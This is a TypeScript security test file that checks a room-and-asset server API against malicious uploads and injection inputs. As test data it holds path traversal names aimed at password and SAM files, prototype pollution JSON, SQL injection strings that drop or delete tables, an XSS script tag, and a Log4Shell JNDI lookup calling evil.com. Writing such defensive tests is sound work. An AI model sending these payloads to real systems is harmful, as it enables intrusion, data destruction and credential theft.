// tests/security/penetration/input-validation.test.ts
import { describe, it, expect } from 'vitest';
import request from 'supertest';
import { app } from '@server/index';

describe('Input Validation Security Tests', () => {
  describe('File Upload Security', () => {
    it('should reject malicious file types', async () => {
      const maliciousFiles = [
        { name: 'malware.exe', type: 'application/x-executable' },
        { name: 'script.php', type: 'application/x-php' },
        { name: 'shell.sh', type: 'application/x-sh' },
        { name: 'virus.bat', type: 'application/x-bat' },
        { name: 'backdoor.jsp', type: 'application/x-jsp' }
      ];

      for (const file of maliciousFiles) {
        await request(app)
          .post('/api/rooms/test-room/assets')
          .set('Authorization', 'Bearer valid-token')
          .attach('file', Buffer.from('malicious content'), file.name)
          .expect(res => {
            expect(res.status).toBeGreaterThanOrEqual(400);
          });
      }
    });

    it('should prevent path traversal in file names', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      for (const payload of pathTraversalPayloads) {
        await request(app)
          .post('/api/rooms/test-room/assets')
          .set('Authorization', 'Bearer valid-token')
          .attach('file', Buffer.from('test content'), payload)
          .expect(res => {
            expect(res.status).toBeGreaterThanOrEqual(400);
          });
      }
    });
  });

  describe('JSON Payload Validation', () => {
    it('should handle malformed JSON safely', async () => {
      const malformedPayloads = [
        '{"name": "' + 'A'.repeat(10000) + '"}', // Extremely long string
        '{"__proto__": {"isAdmin": true}}', // Prototype pollution
        '{"constructor": {"prototype": {"isAdmin": true}}}' // Constructor pollution
      ];

      for (const payload of malformedPayloads) {
        await request(app)
          .post('/api/rooms')
          .set('Authorization', 'Bearer valid-token')
          .set('Content-Type', 'application/json')
          .send(payload)
          .expect(res => {
            expect(res.status).toBeGreaterThanOrEqual(400);
          });
      }
    });
  });

  describe('URL Parameter Injection', () => {
    it('should sanitize URL parameters', async () => {
      const injectionPayloads = [
        'test"; DROP TABLE rooms; --',
        'test\'; DELETE FROM users WHERE 1=1; --',
        'test<script>alert("xss")</script>',
        'test${jndi:ldap://evil.com/a}'
      ];

      for (const payload of injectionPayloads) {
        await request(app)
          .get(`/api/rooms/${encodeURIComponent(payload)}`)
          .set('Authorization', 'Bearer valid-token')
          .expect(res => {
            expect(res.status).not.toBe(500);
            if (res.body) {
              expect(JSON.stringify(res.body)).not.toContain('<script>');
              expect(JSON.stringify(res.body)).not.toContain('DROP TABLE');
            }
          });
      }
    });
  });
});
